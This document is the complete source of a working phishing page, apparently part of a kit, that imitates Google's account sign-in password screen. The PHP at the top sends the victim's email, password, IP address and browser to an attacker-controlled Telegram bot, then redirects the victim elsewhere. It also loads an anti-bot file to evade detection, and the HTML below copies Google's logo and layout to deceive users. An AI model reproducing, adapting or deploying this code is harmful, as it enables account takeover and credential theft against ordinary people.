<?php
error_reporting(0);
session_start();

// Load config - config.php uses return, so capture it
$settings = include('config.php');

// Include antibot if it exists
if (file_exists('antibot.php')) {
    include('antibot.php');
}

// Redirect to index if no session username
if (!isset($_SESSION['username'])) {
    header("Location: index.html");
    exit();
}

$email = $_SESSION['username'];

// Define IP address
$IP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// Detect OS/Browser from User-Agent
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$os = 'Unknown';
if (preg_match('/Windows/i', $user_agent)) $os = 'Windows';
elseif (preg_match('/Mac/i', $user_agent)) $os = 'Mac OS';
elseif (preg_match('/Linux/i', $user_agent)) $os = 'Linux';
elseif (preg_match('/Android/i', $user_agent)) $os = 'Android';
elseif (preg_match('/iPhone|iPad/i', $user_agent)) $os = 'iOS';

// Detect browser
$browser = 'Unknown';
if (preg_match('/Edge/i', $user_agent)) $browser = 'Edge';
elseif (preg_match('/Opera|OPR/i', $user_agent)) $browser = 'Opera';
elseif (preg_match('/Firefox/i', $user_agent)) $browser = 'Firefox';
elseif (preg_match('/Chrome/i', $user_agent)) $browser = 'Chrome';
elseif (preg_match('/Safari/i', $user_agent)) $browser = 'Safari';
$os = $browser . ' on ' . $os;

// Handle POST form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['fldPassword'] ?? '';

    // Build Telegram message
    $msgtg = "🔐 <b>NEW LOGIN</b> 🔐\n";
    $msgtg .= "━━━━━━━━━━━━━━━\n\n";
    $msgtg .= "📧 <b>Email:</b> <code>{$email}</code>\n";
    $msgtg .= "🔑 <b>Password:</b> <code>{$password}</code>\n";
    $msgtg .= "📍 <b>IP:</b> <code>{$IP}</code>\n";
    $msgtg .= "💻 <b>Browser:</b> <code>{$os}</code>\n";
    $msgtg .= "━━━━━━━━━━━━━━━\n";
    $msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";

    // Send Telegram notification
    if (is_array($settings) && isset($settings['telegram']) && $settings['telegram'] == "1" && !empty($settings['chat_id']) && !empty($settings['bot_url'])) {
        $send = [
            'chat_id' => $settings['chat_id'],
            'text' => $msgtg,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $website = "https://api.telegram.org/bot{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    // Redirect to redirect_url after capturing credentials
    $redirect = (is_array($settings) && !empty($settings['redirect_url'])) ? $settings['redirect_url'] : 'https://www.google.com';
    header("Location: " . $redirect);
    exit();
}

$page_id = $_GET['id'] ?? bin2hex(random_bytes(16));
?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr" class="eC9N2e">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<base href=".">
<link rel="preconnect" href="https://www.gstatic.com/">
<meta name="referrer" content="origin">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background-color: #fff;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    font-size: 14px;
    color: #202124;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}
.container {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 48px 16px;
}
.card {
    width: 100%;
    max-width: 450px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
}
@media (max-width: 480px) {
    .card { border: none; padding: 24px 24px 36px; }
    .container { padding: 0; align-items: flex-start; }
}
.logo { text-align: center; margin-bottom: 16px; }
.logo svg { height: 24px; width: 74px; }
h1 {
    font-size: 24px;
    font-weight: 400;
    letter-spacing: 0;
    line-height: 1.3;
    color: #202124;
    text-align: center;
    margin-bottom: 8px;
}
.email-row {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 32px;
    border: 1px solid #dadce0;
    border-radius: 20px;
    padding: 6px 14px;
    width: fit-content;
    margin-left: auto;
    margin-right: auto;
    cursor: pointer;
    text-decoration: none;
    color: #202124;
    font-size: 14px;
}
.email-row:hover { background-color: #f1f3f4; }
.email-row svg { margin-right: 8px; flex-shrink: 0; }
.email-row .email-text { max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.input-wrapper {
    position: relative;
    margin-bottom: 8px;
}
.input-wrapper input[type="password"] {
    width: 100%;
    height: 56px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    padding: 13px 16px 0;
    font-size: 16px;
    font-family: inherit;
    color: #202124;
    background: transparent;
    outline: none;
    transition: border-color 0.2s;
}
.input-wrapper input[type="password"]:focus { border-color: #1a73e8; border-width: 2px; }
.input-wrapper input[type="password"].error-field { border-color: #d93025; border-width: 2px; }
.input-wrapper label {
    position: absolute;
    top: 50%;
    left: 16px;
    transform: translateY(-50%);
    font-size: 16px;
    color: #80868b;
    pointer-events: none;
    transition: all 0.15s ease;
    background: #fff;
    padding: 0 4px;
}
.input-wrapper input[type="password"]:focus ~ label,
.input-wrapper input[type="password"]:not(:placeholder-shown) ~ label {
    top: 0;
    font-size: 12px;
    color: #1a73e8;
}
.input-wrapper input[type="password"].error-field ~ label,
.input-wrapper input[type="password"].error-field:focus ~ label {
    color: #d93025;
}
.error-msg {
    color: #d93025;
    font-size: 12px;
    margin-top: 4px;
    display: flex;
    align-items: center;
    gap: 4px;
    min-height: 18px;
}
.forgot-link {
    display: inline-block;
    margin-top: 8px;
    color: #1a73e8;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
}
.forgot-link:hover { text-decoration: underline; }
.actions {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-top: 28px;
}
.btn-next {
    background-color: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 0 24px;
    height: 36px;
    font-size: 14px;
    font-weight: 500;
    font-family: inherit;
    cursor: pointer;
    letter-spacing: 0.25px;
    min-width: 88px;
    transition: background-color 0.2s, box-shadow 0.2s;
}
.btn-next:hover { background-color: #1557b0; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3),0 1px 3px 1px rgba(60,64,67,0.15); }
.btn-next:active { background-color: #0d47a1; }
footer {
    text-align: center;
    padding: 16px;
    color: #70757a;
    font-size: 12px;
}
footer a { color: #70757a; text-decoration: none; margin: 0 8px; }
footer a:hover { text-decoration: underline; }
</style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 74 24" aria-label="Google">
                <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" fill="#4285F4"/>
                <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
                <path d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.83c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.49 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z" fill="#4285F4"/>
                <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
                <path d="M58.13 17.56V.24h-2.55v17.32z" fill="#34A853"/>
                <path d="M65.39 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.29-1.96-3.68-4.97-3.68-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.58-2.86 1.58zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z" fill="#EA4335"/>
            </svg>
        </div>

        <h1>Welcome</h1>

        <a class="email-row" href="index.html">
            <svg focusable="false" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#5f6368"/>
            </svg>
            <span class="email-text"><?php echo htmlspecialchars($email, ENT_QUOTES, 'UTF-8'); ?></span>
        </a>

        <form method="POST" action="pass.php?id=<?php echo htmlspecialchars($page_id, ENT_QUOTES, 'UTF-8'); ?>" novalidate>
            <div class="input-wrapper">
                <input
                    type="password"
                    name="fldPassword"
                    id="fldPassword"
                    placeholder=" "
                    autocomplete="current-password"
                    aria-label="Enter your password"
                >
                <label for="fldPassword">Enter your password</label>
            </div>
            <div class="error-msg" id="passwordError"></div>

            <a class="forgot-link" href="#">Forgot password?</a>

            <div class="actions">
                <div></div>
                <button type="button" class="btn-next" id="submitBtn" onclick="submitForm(event)">Next</button>
            </div>
        </form>
    </div>
</div>

<footer>
    <a href="#">English (United States)</a>
    <a href="#">Help</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
</footer>

<script>
function submitForm(e) {
    e.preventDefault();
    var pwd = document.getElementById('fldPassword');
    var errorDiv = document.getElementById('passwordError');
    var val = pwd.value;

    pwd.classList.remove('error-field');
    errorDiv.innerHTML = '';

    if (val === '') {
        pwd.classList.add('error-field');
        errorDiv.innerHTML = '<svg aria-hidden="true" focusable="false" width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Enter a password';
        pwd.focus();
        return;
    }

    if (val.length < 6) {
        pwd.classList.add('error-field');
        errorDiv.innerHTML = '<svg aria-hidden="true" focusable="false" width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Password must be at least 6 characters';
        pwd.focus();
        return;
    }

    pwd.closest('form').submit();
}

document.getElementById('fldPassword').addEventListener('input', function() {
    this.classList.remove('error-field');
    document.getElementById('passwordError').innerHTML = '';
});

document.getElementById('fldPassword').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        submitForm(e);
    }
});
</script>
</body>
</html>
